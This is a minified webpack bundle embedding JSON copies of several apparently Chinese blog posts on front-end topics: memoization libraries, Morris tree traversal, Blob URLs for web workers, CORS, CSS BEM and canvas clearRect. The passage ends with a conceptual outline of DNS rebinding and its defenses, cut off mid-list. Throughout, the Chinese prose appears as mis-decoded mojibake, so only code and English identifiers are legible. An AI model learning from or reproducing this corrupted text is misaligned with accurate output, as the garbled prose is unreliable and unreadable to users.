(window.webpackJsonp=window.webpackJsonp||[]).push([[15,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203],{545:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"nano-memoize--he--fast-memoize\\">nano-memoize å’Œ fast-memoize</h2>\\n<p>é¦–å…ˆï¼Œè¿™2ä¸ªå·¥å…·çš„å®ç°æºç æ˜¯æå…¶ç›¸ä¼¼çš„ï¼ŒåŸºæœ¬ä¸Šï¼Œåªè¦é˜…è¯»äº†å…¶ä¸­ä¸€ä¸ªæºç ï¼Œä¹Ÿå°±äº†è§£äº†å¦å¤–ä¸€ä¸ªçš„å®ç°ã€‚</p>\\n<p>fast-memoizeå¯¼å›¾ï¼š\\n<img src=\\"/article/img/fast-memoize.png\\" alt=\\"\\"></p>\\n<p>å¤§æ¦‚è¯´è¯´å®ƒä»¬çš„å®ç°æ€è·¯ï¼š</p>\\n<ol>\\n<li>å®šä¹‰ç¼“å­˜ç»“æ„ï¼Œå…¶ä¸­<code>fast</code>ä½¿ç”¨äº†<code>æ— prototypeçš„å¯¹è±¡</code>ï¼Œ<code>nano</code>ä½¿ç”¨äº†<code>æ™®é€šå¯¹è±¡</code>ã€‚</li>\\n<li>å®šä¹‰åºåˆ—åŒ–æ–¹æ³•ï¼šå½“æ£€æµ‹åˆ°æ˜¯å•å‚æ•°æ—¶ï¼Œéƒ½æ˜¯é€‰æ‹©JSON.stringifyï¼Œè€Œå¤šä¸ªå‚æ•°ï¼Œä¸¤è€…æœ‰ä¸åŒï¼ˆåé¢å†è¯´ï¼‰ã€‚</li>\\n<li>å®šä¹‰ç­–ç•¥ï¼šä¹Ÿå°±æ˜¯ç¼“å­˜çš„å…·ä½“æ–¹æ³•ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å¯¹å½“å‰ç¼“å­˜ç»“æ„æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å°±è¿”å›ï¼Œæ‰¾ä¸åˆ°å°±é‡æ–°è¿è¡Œï¼Œ\\n ä¸¤è€…éƒ½ä½¿ç”¨äº†<code>bind</code>æ–¹æ³•æ³¨å…¥å‚æ•°ï¼Œå¯ä»¥çœå»è¿è¡Œæ—¶å†å»æŸ¥æ‰¾å‚æ•°ã€‚</li>\\n</ol>\\n<p>æ¥ç€åˆ†æä¸¤è€…çš„å¼‚åŒï¼š</p>\\n<p>ç›¸åŒå¤„ï¼š</p>\\n<ul>\\n<li>éƒ½ä½¿ç”¨äº†<code>JSON.stringify</code>ä½œä¸ºåºåˆ—åŒ–æ–¹æ³•ï¼Œå› ä¸ºå®ƒæ˜¯åŸç”Ÿçš„ã€‚</li>\\n<li>éƒ½å¯¹è¿”å›çš„ç¼“å­˜å‡½æ•°è¿›è¡Œäº†å‚æ•°æ³¨å…¥ï¼ˆè¿™æ˜¯ä¸€ä¸ªæå¤§æå‡æ€§èƒ½çš„æ–¹æ³•ï¼‰ã€‚</li>\\n<li>å¯¹å•å‚æ•°è¿˜æ˜¯å¤šå‚æ•°çš„åˆ¤æ–­éƒ½æ˜¯ä½¿ç”¨<code>func.length</code>(å½¢å‚çš„æ•°é‡åˆ¤æ–­)ï¼Œå› ä¸º<code>func.length</code>æ¯”<code>arguments.length</code>è¿™ç§åŠ¨æ€åˆ¤æ–­æ€§èƒ½ä¼šå¥½å¾ˆå¤šã€‚</li>\\n</ul>\\n<p>ä¸åŒç‚¹ï¼š</p>\\n<ul>\\n<li><code>fast</code>ä½¿ç”¨äº†<code>æ— prototypeçš„å¯¹è±¡</code>ï¼Œ<code>nano</code>ä½¿ç”¨äº†<code>æ™®é€šå¯¹è±¡</code>(è¿™ä¸€ç‚¹æ€§èƒ½ä¸Šç›¸å·®ä¸å¤š)ã€‚</li>\\n<li>å½“é‡åˆ°å¤šä¸ªå‚æ•°æ—¶ï¼Œ<code>fast</code>è¿˜æ˜¯ç»§ç»­å¯¹<code>arguments</code>è¿›è¡Œåºåˆ—åŒ–ï¼Œè€Œ<code>nano</code>åˆ™å¤æ‚ä¸€ç‚¹ï¼Œå®ƒé€šè¿‡ç”¨æ•°ç»„å°†æ¯ä¸€æ¬¡å¤šä¸ªå‚æ•°ä¿å­˜èµ·æ¥ï¼Œ\\nåç»­é€šè¿‡éå†æ¯ä¸ªå‚æ•°è¿›è¡Œå…¨ç­‰å¯¹æ¯”<code>===</code>ï¼Œåˆ¤æ–­æ˜¯å¦ä»ç¼“å­˜è°ƒå–ç»“æœã€‚</li>\\n<li>åŒæ ·æ˜¯å¤šä¸ªå‚æ•°ï¼Œ<code>nano</code>å¢åŠ äº†ä¸€ä¸ªå‚æ•°maxï¼Œå¯ä»¥è®©ç”¨æˆ·è‡ªå®šä¹‰éœ€è¦è¿›è¡Œå¯¹æ¯”å‚æ•°çš„é•¿åº¦ã€‚</li>\\n</ul>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.fast-memoizeVSnano-memoize/README.md\\">æ›´è¯¦ç»†çš„è¯´æ˜å’Œæ·±å…¥ç†è§£ï¼Œå¯æŸ¥çœ‹æºç å­¦ä¹ â€”â€”fast,nano</a></p>\\n<p>å‡è®¾ï¼š</p>\\n<ul>\\n<li>å¿½ç•¥===çš„æ‰§è¡Œæ—¶é—´</li>\\n<li>ä½¿ç”¨çš„å‚æ•°åˆ†ä¸º å¼•ç”¨ç›¸åŒ å’Œ å¼•ç”¨ä¸åŒ(ä½†æ˜¯æ·±æ¯”è¾ƒä¸ºtrue)</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th><em>è€—æ—¶æ“ä½œ</em></th>\\n<th><em>å¤šä¸ªå‚æ•°(å¼•ç”¨ç›¸åŒ)</em></th>\\n<th></th>\\n<th><em>å¤šä¸ªå‚æ•°(å¼•ç”¨ä¸åŒ)</em></th>\\n<th></th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>çŠ¶æ€</td>\\n<td>é¦–æ¬¡è¿è¡Œ</td>\\n<td>åç»­è¿è¡Œ</td>\\n<td>é¦–æ¬¡è¿è¡Œ</td>\\n<td>åç»­è¿è¡Œ</td>\\n</tr>\\n<tr>\\n<td>fast</td>\\n<td>åºåˆ—åŒ–+è¿è¡Œ</td>\\n<td>åºåˆ—åŒ–</td>\\n<td>åºåˆ—åŒ–+è¿è¡Œ</td>\\n<td>åºåˆ—åŒ–</td>\\n</tr>\\n<tr>\\n<td>nano</td>\\n<td>è¿è¡Œ</td>\\n<td>0</td>\\n<td>è¿è¡Œ</td>\\n<td>è¿è¡Œ</td>\\n</tr>\\n</tbody></table>\\n","toc":[{"anchor":"nano-memoize--he--fast-memoize","level":2,"text":"nano-memoize å’Œ fast-memoize"}],"relatedTags":null,"created_at":"2018-07-15","timeArr":[2018,6,15,0,0,0,0],"title":"2ä¸ªJSç¼“å­˜å·¥å…·å­¦ä¹ å¿ƒå¾—","uuid":"a6a06a76f20c9fd24c4954c100dbd016a75a5974","summary":"<h4>nano-memoize å’Œ fast-memoize</h4>\\n<p>é¦–å…ˆï¼Œè¿™2ä¸ªå·¥å…·çš„å®ç°æºç æ˜¯æå…¶ç›¸ä¼¼çš„ï¼ŒåŸºæœ¬ä¸Šï¼Œåªè¦é˜…è¯»äº†å…¶ä¸­ä¸€ä¸ªæºç ï¼Œä¹Ÿå°±äº†è§£äº†å¦å¤–ä¸€ä¸ªçš„å®ç°ã€‚</p>\\n<p>fast-memoizeå¯¼å›¾ï¼š\\n<img src=\\"/article/img/fast-memoize.png\\" alt=\\"\\"></p>\\n<p>å¤§æ¦‚è¯´è¯´å®ƒä»¬çš„å®ç°æ€è·¯ï¼š</p>\\n<ol>\\n<li>å®šä¹‰ç¼“å­˜ç»“æ„ï¼Œå…¶...</li>\\n</ol>","slug":"2-ge-JS-huan-cun-gong-ju-xue-xi-xin-de","sha":"4bdf87c5d346920df9247464ab6b24fdcc7791ab"}')},546:function(n){n.exports=JSON.parse('{"content":"<p>å…³äºäºŒå‰æ ‘çš„éå†ï¼Œä½¿ç”¨æ ˆé€’å½’æˆ–è€…ä»¿æ ˆå¾ªç¯éƒ½æ˜¯éœ€è¦<code>O(N)</code>çš„ç©ºé—´ï¼Œ<code>Morris Traversal</code>ä¿è¯äº†ç©ºé—´ä¸º<code>O(1)</code>ï¼Œæ—¶é—´è¿˜æ˜¯<code>O(N)</code>ï¼ˆæ¯”åŸæ¥å¤šäº†ä¸€éï¼‰ã€‚</p>\\n<p>è¿™é‡Œåªä»‹ç»<code>inOrder</code>é¡ºåºã€‚</p>\\n<p>æ€è·¯ï¼š</p>\\n<p>å¯¹æ¯ä¸€ä¸ª<code>cur</code>èŠ‚ç‚¹ï¼Œä¼˜å…ˆæ‰¾åˆ°ä¸€ä¸ª<code>pre</code>èŠ‚ç‚¹ï¼Œè¿™ä¸ª<code>pre</code>èŠ‚ç‚¹çš„ä½œç”¨æ˜¯ï¼Œå½“åç»­<code>cur</code>èŠ‚ç‚¹éå†                åˆ°è¿™ä¸ªä½ç½®æ—¶ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ª<code>pre</code>èŠ‚ç‚¹è¿”å›å®ƒéœ€è¦è¿”å›çš„ä½ç½®ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>        6\\n       / \\\\\\n      4   8\\n    /  \\\\\\n   2    5</code></pre></code></pre><ul>\\n<li>ä¸Šé¢å½“<code>cur</code>èŠ‚ç‚¹åœ¨<code>6</code>çš„æ—¶å€™ï¼Œ<code>pre</code>èŠ‚ç‚¹ä¼šåœ¨<code>5</code>ï¼Œå› ä¸ºåé¢å½“<code>cur</code>èŠ‚ç‚¹éå†åˆ°<code>5</code>çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡<code>pre</code>èŠ‚ç‚¹ç›´æ¥è¿”å›<code>6</code></li>\\n<li>å½“<code>cur</code>èŠ‚ç‚¹å†<code>4</code>çš„æ—¶å€™ï¼Œ<code>pre</code>èŠ‚ç‚¹ä¼šåœ¨<code>2</code>ï¼Œå½“åé¢<code>cur</code>åˆ°<code>2</code>çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥è¿”å›<code>4</code></li>\\n</ul>\\n<hr>\\n<p><code>pre</code>æ‰¾åˆ°äº†ï¼Œæ˜¯é€šè¿‡ä»€ä¹ˆè¿”å›å‘¢ï¼Œå› ä¸ºä¸èƒ½ä¿®æ”¹äºŒå‰æ ‘ç»“æ„ï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨å †æ ˆè®°å½•ã€‚</p>\\n<p>é€šè¿‡<code>mirror</code>(é•œåƒ)ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æ‰¾åˆ°<code>pre</code>çš„æ—¶å€™ï¼ˆæ¯ä¸ª<code>pre</code>çš„å³èŠ‚ç‚¹ç¡®ä¿ä¸ºnullï¼‰ï¼Œåœ¨å®ƒçš„å³èŠ‚ç‚¹åˆ›å»ºä¸€ä¸ªé•œåƒèŠ‚ç‚¹ï¼Œ\\nè¿™ä¸ªé•œåƒèŠ‚ç‚¹ç›´æ¥æŒ‡å‘å½“å‰çš„<code>cur</code>èŠ‚ç‚¹ã€‚</p>\\n<p>è¿™ä¸ªæ“ä½œæ˜¯ä¸å ç”¨ç©ºé—´çš„ï¼Œå› ä¸ºåªæ˜¯äº’ç›¸å¼•ç”¨ã€‚</p>\\n<p>ä¾‹å¦‚ï¼šå½“ä¸Šé¢çš„<code>cur</code>ä¸º<code>6</code>ï¼Œ<code>pre</code>ä¸º<code>5</code>ï¼Œé‚£ä¹ˆè®¾ç½®<code>pre.right=cur</code>ï¼Œæ„Ÿè§‰ä¸Šæ˜¯è¿™æ ·ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>        6\\n       / \\\\\\n      4   8\\n    /  \\\\\\n   2    5\\n         \\\\\\n          6\\n         / \\\\\\n        4   8\\n        ...</code></pre></code></pre><p> å…¶å®å¹¶æ²¡æœ‰å¤šå‡ºæ¥é‚£ä¸€å—ï¼Œåªæ˜¯<code>5</code>å¼•ç”¨åˆ°<code>6</code>ç½¢äº†</p>\\n<pre><code><pre class=\\"hljs\\"><code>         6\\n       / â†‘ \\\\\\n      4  â†‘  8\\n    /   \\\\â†‘\\n  2      5\\n</code></pre></code></pre><hr>\\n<p>ç†è§£äº†è¿™äº›ï¼Œé‚£ä¹ˆåç»­å°±ç®€å•äº†ï¼Œå½“<code>cur</code>éå†åˆ°<code>pre</code>çš„æ—¶å€™å¹¶ä¸”æ‰“å°åï¼Œå°†<code>pre</code>æ–°å¢çš„å¼•ç”¨åˆ é™¤æ¢å¤åŸæ¥çš„æ ‘ä¾¿å¯ã€‚</p>\\n<p>ä»£ç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">morrisTraversal</span>(<span class=\\"hljs-params\\">root</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> cur=root,pre\\n  <span class=\\"hljs-keyword\\">while</span>(cur!=<span class=\\"hljs-literal\\">null</span>){\\n    <span class=\\"hljs-comment\\">// å½“å·¦ä¸ºç©ºï¼Œç›´æ¥æ‰“å°</span>\\n    <span class=\\"hljs-keyword\\">if</span>(cur.left==<span class=\\"hljs-literal\\">null</span>){\\n      <span class=\\"hljs-built_in\\">console</span>.log(cur.val)\\n      cur=cur.right\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      <span class=\\"hljs-comment\\">// å½“å·¦ä¸ä¸ºç©ºï¼Œå…ˆå»æ‰¾ pre</span>\\n      pre=cur.left\\n      <span class=\\"hljs-keyword\\">while</span>(pre.right!=<span class=\\"hljs-literal\\">null</span> &amp;&amp; pre.right!==cur){\\n        pre=pre.right\\n      }\\n      <span class=\\"hljs-comment\\">// å»ºç«‹å¼•ç”¨ï¼Œç”¨äºè¿”å›</span>\\n      <span class=\\"hljs-keyword\\">if</span>(pre.right==<span class=\\"hljs-literal\\">null</span>){\\n        pre.right=cur\\n        cur=cur.left\\n      }<span class=\\"hljs-keyword\\">else</span>{\\n        <span class=\\"hljs-comment\\">// åˆ é™¤å¼•ç”¨</span>\\n        <span class=\\"hljs-built_in\\">console</span>.log(cur.val)\\n        pre.right=<span class=\\"hljs-literal\\">null</span>\\n        cur=cur.right\\n      }\\n    }\\n  }\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2019-01-09","timeArr":[2019,0,9,0,0,0,0],"title":"BSTçš„Morris Traversal-O(1)éå†","uuid":"6bb049b1a078a0b78387fb4624933c478107281e","summary":"<p>å…³äºäºŒå‰æ ‘çš„éå†ï¼Œä½¿ç”¨æ ˆé€’å½’æˆ–è€…ä»¿æ ˆå¾ªç¯éƒ½æ˜¯éœ€è¦<code>O(N)</code>çš„ç©ºé—´ï¼Œ<code>Morris Traversal</code>ä¿è¯äº†ç©ºé—´ä¸º<code>O(1)</code>ï¼Œæ—¶é—´è¿˜æ˜¯<code>O(N)</code>ï¼ˆæ¯”åŸæ¥å¤šäº†ä¸€éï¼‰ã€‚</p>\\n<p>è¿™é‡Œåªä»‹ç»<code>inOrder</code>é¡ºåºã€‚</p>\\n<p>æ€è·¯ï¼š</p>\\n<p>å¯¹æ¯ä¸€ä¸ª<code>cur</code>èŠ‚ç‚¹ï¼Œä¼˜å…ˆæ‰¾åˆ°ä¸€ä¸ª<code>pre</code>èŠ‚ç‚¹ï¼Œè¿™ä¸ª<code>pre</code>èŠ‚ç‚¹çš„ä½œç”¨æ˜¯ï¼Œå½“åç»­<code>cur</code>èŠ‚...</p>","slug":"BST-de-Morris-Traversal-O(1)-bian-li","sha":"58cf220aadf082c27c39c6bf0db303d77f20ea86"}')},547:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"blob-yu-createobjecturl-da-pei-shi-yong\\">Blobä¸createObjectURLæ­é…ä½¿ç”¨</h2>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> blob = <span class=\\"hljs-keyword\\">new</span> Blob([<span class=\\"hljs-built_in\\">document</span>.querySelector(<span class=\\"hljs-string\\">\'#worker\'</span>).textContent]);\\n<span class=\\"hljs-keyword\\">var</span> url = <span class=\\"hljs-built_in\\">window</span>.URL.createObjectURL(blob);\\n<span class=\\"hljs-keyword\\">var</span> worker = <span class=\\"hljs-keyword\\">new</span> Worker(url);\\n\\nworker.onmessage = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">e</span>) </span>{\\n  <span class=\\"hljs-comment\\">// e.data === \'some message\'</span>\\n};</code></pre></code></pre>\\n<blockquote>\\n<p><code>Blob</code>å¯¹è±¡è¡¨ç¤ºä¸€ä¸ªä¸å¯å˜ã€åŸå§‹æ•°æ®çš„ç±»æ–‡ä»¶å¯¹è±¡ï¼Œè¯»å–å®ƒéœ€è¦ä½¿ç”¨FileReader</p>\\n</blockquote>\\n<blockquote>\\n<p>URL.createObjectURLï¼Œä¸€ä¸ªå®éªŒæ€§åŠŸèƒ½ï¼Œä½†å¯ä»¥åœ¨webworkerä¸­ä½¿ç”¨ï¼Œåˆ›å»ºä¸€ä¸ªurlï¼Œè¿™ä¸ªæ–°çš„URL å¯¹è±¡è¡¨ç¤ºæŒ‡å®šçš„ File å¯¹è±¡æˆ– Blob å¯¹è±¡ã€‚</p>\\n</blockquote>\\n<p>è¿™é‡Œblobç”¨æ¥ä¿å­˜äº†ä¸€æ®µ<code>script</code>æ ‡ç­¾å†…éƒ¨çš„å†…å®¹ï¼Œå†é€šè¿‡<code>createObjectURL</code>å°†å®ƒåˆ›å»ºæˆurlæ ¼å¼ï¼Œè®©<code>web worker</code>è¯»å–ã€‚</p>\\n","toc":[{"anchor":"blob-yu-createobjecturl-da-pei-shi-yong","level":2,"text":"Blobä¸createObjectURLæ­é…ä½¿ç”¨"}],"relatedTags":null,"created_at":"2018-07-24","timeArr":[2018,6,24,0,0,0,0],"title":"Blobå¯¹è±¡å’ŒcreateObjectURL","uuid":"c2c3bf8775d224910f8bdac31eb7e0ff5a28d431","summary":"<h4>Blobä¸createObjectURLæ­é…ä½¿ç”¨</h4>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> blob = <span class=\\"hljs-keyword\\">new</span> Blob([<span class=\\"hljs-built_in\\">document</span>.querySelector(<span class=\\"hljs-string\\">\'#worker\'</span>).textContent]);\\n<span class=\\"hljs-keyword\\">var</span> url = <span class=\\"hljs-built_in\\">window</span>.URL.createObjectURL(blob);\\n<span class=\\"hljs-keyword\\">var</span> worker ...</code></pre>","slug":"Blob-dui-xiang-he-createObjectURL","sha":"92b4e89a32882a49232d054e12b2f724a0e9fa68"}')},548:function(n){n.exports=JSON.parse('{"content":"<p>CORSé€šä¿¡å°±æ˜¯æœåŠ¡ç«¯è®¾ç½®<code>Access-Control-Allow-Origin</code>ç­‰é…ç½®</p>\\n<p>åˆ†ä¸º2ç±»è¯·æ±‚ï¼Œç®€å•è¯·æ±‚å’Œéç®€å•è¯·æ±‚</p>\\n<ul>\\n<li><p>ç®€å•è¯·æ±‚ï¼š</p>\\n<p>  æ— é¢„æ£€ï¼Œç›´æ¥ä¼ é€’æ•°æ®çš„æ—¶å€™æ£€æŸ¥æ˜¯å¦åŒæº</p>\\n<p>  Content-Typeç±»å‹ï¼š</p>\\n<p> <code>application/x-www-form-urlencoded</code> é”®å€¼å¯¹å½¢å¼ a=1&amp;b=2</p>\\n<p>  <code>multipart/form-data</code> è¡¨å•(é”®å€¼å¯¹æˆ–è€…æ–‡ä»¶)ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨äº†<code>new FormData()</code>å†<code>xhr.send()</code>çš„æ ¼å¼</p>\\n<p>  <code>text/plain</code>çº¯æ–‡æœ¬</p>\\n</li>\\n<li><p>éç®€å•è¯·æ±‚ï¼š</p>\\n<p>  é¢„æ£€æœºåˆ¶ï¼š</p>\\n<p>  å…ˆæ£€æµ‹æ˜¯å¦é€šè¿‡åŒæºæœºåˆ¶ï¼Œé€šè¿‡äº†å†è¿›è¡Œä¼ é€’</p>\\n</li>\\n</ul>\\n<p>å‚è€ƒï¼š<a href=\\"https://wangdoc.com/javascript/bom/cors.html\\">https://wangdoc.com/javascript/bom/cors.html</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-14","timeArr":[2018,7,14,0,0,0,0],"title":"CORSé€šä¿¡","uuid":"4aa3042e4e1e6dbca1c52b5895fc12ef898bb9a1","summary":"<p>CORSé€šä¿¡å°±æ˜¯æœåŠ¡ç«¯è®¾ç½®<code>Access-Control-Allow-Origin</code>ç­‰é…ç½®</p>\\n<p>åˆ†ä¸º2ç±»è¯·æ±‚ï¼Œç®€å•è¯·æ±‚å’Œéç®€å•è¯·æ±‚</p>\\n<ul>\\n<li>\\n<p>ç®€å•è¯·æ±‚ï¼š</p>\\n<p>æ— é¢„æ£€ï¼Œç›´æ¥ä¼ é€’æ•°æ®çš„æ—¶å€™æ£€æŸ¥æ˜¯å¦åŒæº</p>\\n<p>Content-Typeç±»å‹ï¼š</p>\\n<p>`application/x-www-form-urlenco...</p>\\n</li>\\n</ul>","slug":"CORS-tong-xin","sha":"bc9cd7d945070b9e0abe4cde44baf13cf7044425"}')},549:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"css--de-bem-fang-fa-he-7-1-gui-ze\\">css çš„BEMæ–¹æ³•å’Œ7-1è§„åˆ™</h2>\\n<h3 id=\\"bem\\">BEM</h3>\\n<p>æŒ‰ç…§<code>Block__Element--Modifier</code>å‘½å</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>article__author\\narticle__date\\narticle__content-leftAlign\\narticle__content-centerAlign</code></pre></code></pre><p>å‘½åè§„åˆ™ï¼š</p>\\n<ul>\\n<li><p>B(Block)ï¼šè¡¨ç¤ºæ¨¡å—ï¼Œæœ€å°çš„å¯å¤ç”¨å•å…ƒï¼ŒåŠŸèƒ½ç‹¬ç«‹ï¼Œå¯ä»¥åµŒå¥—ã€ç»„åˆä½¿ç”¨</p>\\n</li>\\n<li><p>E(Element)ï¼šBçš„ç»„æˆéƒ¨åˆ†</p>\\n</li>\\n<li><p>Mï¼ˆModifierï¼‰ï¼šè¡¨ç¤ºEçš„çŠ¶æ€ï¼ˆä¸åŒçŠ¶æ€ä¸‹çš„Eæœ‰ä¸åŒçš„åŠŸèƒ½å’Œå¤–è§‚ï¼‰ï¼Œä¹Ÿæ˜¯Bçš„ç»„æˆéƒ¨åˆ†</p>\\n</li>\\n</ul>\\n<hr>\\n<h3 id=\\"7-1-gui-ze\\">7-1è§„åˆ™</h3>\\n<ul>\\n<li><p>base: æ ·æ¿ä»£ç ï¼Œæ¯æ¬¡æ–°é¡¹ç›®éƒ½è¦ä½¿ç”¨çš„ï¼Œä¾‹å¦‚æ¶ˆé™¤marginç­‰ç­‰</p>\\n</li>\\n<li><p>components: é¡µé¢çš„ç»„ä»¶ï¼Œä¾‹å¦‚ buttons, forms, swipers, popups</p>\\n</li>\\n<li><p>layout: layoutç»“æ„ï¼Œä¾‹å¦‚headerï¼Œfooter</p>\\n</li>\\n<li><p>pages: ä¸€äº›ç‰¹å®šçš„é¡µé¢css</p>\\n</li>\\n<li><p>themes: ä¸ä¸»é¢˜ç›¸å…³çš„css</p>\\n</li>\\n<li><p>abstracts: æ”¾ç½®å‡½æ•°ï¼Œå˜é‡å’Œmixinç­‰è¾…åŠ©ç±»</p>\\n</li>\\n<li><p>vendors: å¤–éƒ¨ä¾èµ–ï¼Œä¾‹å¦‚ Font Awesome file, Bootstrap</p>\\n</li>\\n</ul>\\n","toc":[{"anchor":"css--de-bem-fang-fa-he-7-1-gui-ze","level":2,"text":"css çš„BEMæ–¹æ³•å’Œ7-1è§„åˆ™"},{"anchor":"bem","level":3,"text":"BEM"},{"anchor":"7-1-gui-ze","level":3,"text":"7-1è§„åˆ™"}],"relatedTags":null,"created_at":"2018-08-08","timeArr":[2018,7,8,0,0,0,0],"title":"CSS BEMå’Œ7-1","uuid":"7d006085fe6510e84760d5dac1964ffab407a64b","summary":"<h4>css çš„BEMæ–¹æ³•å’Œ7-1è§„åˆ™</h4>\\n<h4>BEM</h4>\\n<p>æŒ‰ç…§<code>Block__Element--Modifier</code>å‘½å</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code>article__author\\narticle__date\\narticle__content-leftAlign\\narticle__content-centerAlign\\n</code></pre>\\n<p>...</p>","slug":"CSS-BEM-he-7-1","sha":"749d64da627880acf963a5302a4e38ce920592d5"}')},550:function(n){n.exports=JSON.parse('{"content":"<p>æœ‰æ—¶å€™åœ¨æ‰§è¡Œ<code>ctx.clearRect</code>æ—¶ï¼Œå¹¶ä¸èƒ½æ¸…é™¤å›¾ç‰‡ï¼Œä½†é€šè¿‡æ§åˆ¶å°è°ƒè¯•å´æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚</p>\\n<p>é€šå¸¸è¿™å‘ç”Ÿåœ¨è°ƒç”¨äº†ä¾‹å¦‚ï¼š<code>lineTo(), arc(), rect()</code>ç­‰ç­‰ï¼Œç„¶åæ‰§è¡Œ<code>stroke()</code>æˆ–è€…<code>fill()</code>ï¼›</p>\\n<p>è¿™å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨ç»˜åˆ¶è·¯å¾„æ—¶å¹¶æ²¡æœ‰è°ƒç”¨<code>beginPath()</code>ï¼Œè¿™å¯¼è‡´è·¯å¾„çš„ç»˜åˆ¶å°†å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œå› æ­¤<code>clearRect</code>ä¼šä¸èµ·ä½œç”¨ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2019-07-10","timeArr":[2019,6,10,0,0,0,0],"title":"Canvasè°ƒç”¨clearRectæ— æ³•æ¸…é™¤çš„è§£å†³æ–¹æ¡ˆ","uuid":"617347c3dd758ed8c49bf011e3ff8d354a6cc190","summary":"<p>æœ‰æ—¶å€™åœ¨æ‰§è¡Œ<code>ctx.clearRect</code>æ—¶ï¼Œå¹¶ä¸èƒ½æ¸…é™¤å›¾ç‰‡ï¼Œä½†é€šè¿‡æ§åˆ¶å°è°ƒè¯•å´æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚</p>\\n<p>é€šå¸¸è¿™å‘ç”Ÿåœ¨è°ƒç”¨äº†ä¾‹å¦‚ï¼š<code>lineTo(), arc(), rect()</code>ç­‰ç­‰ï¼Œç„¶åæ‰§è¡Œ<code>stroke()</code>æˆ–è€…<code>fill()</code>ï¼›</p>\\n<p>è¿™å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨ç»˜åˆ¶è·¯å¾„æ—¶å¹¶æ²¡æœ‰è°ƒç”¨<code>beginPath()</code>ï¼Œè¿™å¯¼è‡´è·¯å¾„çš„ç»˜åˆ¶å°†å‚¨å­˜...</p>","slug":"Canvas-diao-yong-clearRect-wu-fa-qing-chu-de-jie-jue-fang-an","sha":"0f2e7a7c503d0890c669f8263054b37e4ce2f1e2"}')},551:function(n){n.exports=JSON.parse('{"content":"<p>æ”»å‡»è€…éœ€è¦çŸ¥é“çš„ï¼š</p>\\n<ul>\\n<li>çŸ¥é“è¢«æ”»å‡»ç½‘ç«™åœ°å€</li>\\n<li>çŸ¥é“è¢«æ”»å‡»ç½‘ç«™<strong>å†…éƒ¨</strong>ç¼ºå°‘è®¤è¯ç¯èŠ‚</li>\\n<li>çŸ¥é“éœ€è¦è¯·æ±‚çš„(ç›®æ ‡)å­˜æ”¾åœ¨å“ªä¸ªä½ç½®</li>\\n</ul>\\n<p>è¢«æ”»å‡»è¿™éœ€è¦åšçš„ï¼š</p>\\n<ul>\\n<li>é€šè¿‡è¯±å¯¼é“¾æ¥è®¿é—®äº†æ¶æ„ç½‘ç«™</li>\\n</ul>\\n<p>æ‰§è¡Œå…³é”®ç‚¹</p>\\n<ul>\\n<li>æ¶æ„ç½‘ç«™ç¬¬ä¸€æ¬¡å“åº”DNSä¸ºå®é™…DNSï¼ŒTTLæçŸ­ï¼Œç„¶åæ‰§è¡Œè¯·æ±‚(ä½œç”¨åœ¨æ¶æ„ç½‘ç«™ä¸Š)ã€‚</li>\\n<li>æ¶æ„ç½‘ç«™ç¬¬äºŒæ¬¡å“åº”DNSä¸ºTargetçš„IPåœ°å€ï¼Œç»§ç»­æ‰§è¡Œä»¥ä¸Šè¯·æ±‚(ä½œç”¨åœ¨ç›®æ ‡ç½‘ç«™ä¸Š)ã€‚</li>\\n</ul>\\n<p>é˜²æŠ¤æªæ–½</p>\\n<ol>\\n<li><p>å¢åŠ éªŒè¯(Authorization)ã€‚</p>\\n</li>\\n<li><p>IPæ ¹æ®ç¬¬ä¸€æ¬¡DNSå“åº”å€¼é”å®šã€‚(å¯¹äºæ­£å¸¸çš„åŠ¨æ€DNSä¸æ–¹ä¾¿)</p>\\n</li>\\n<li><p>æ 